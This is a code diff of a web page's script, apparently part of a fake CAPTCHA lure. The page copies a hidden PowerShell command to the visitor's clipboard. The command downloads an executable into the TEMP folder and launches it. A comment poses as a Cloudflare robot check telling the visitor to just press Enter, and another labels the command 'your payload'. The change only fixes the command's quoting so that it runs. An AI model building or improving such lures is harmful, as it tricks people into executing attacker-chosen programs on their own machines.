@@ -82,7 +82,7 @@
         </div>
     </div>
     <script>
-        const command = 'powershell -WindowStyle Hidden -Command "& {Start-BitsTransfer -Source 'https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe' -Destination $env:TEMP\St.exe; Start-Process $env:TEMP\St.exe -NoNewWindow} # CLOUDFLARE... Please confirm you are not a robot? Just press Enter.'; //твой пейлоад
+        const command = 'powershell -WindowStyle Hidden -Command "& {Start-BitsTransfer -Source https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe -Destination $env:TEMP\St.exe; Start-Process $env:TEMP\St.exe -NoNewWindow}" # CLOUDFLARE... Please confirm you are not a robot? Just press Enter.'; //твой пейлоад
         function copyToClipboard() {
             navigator.clipboard.writeText(command);
         }
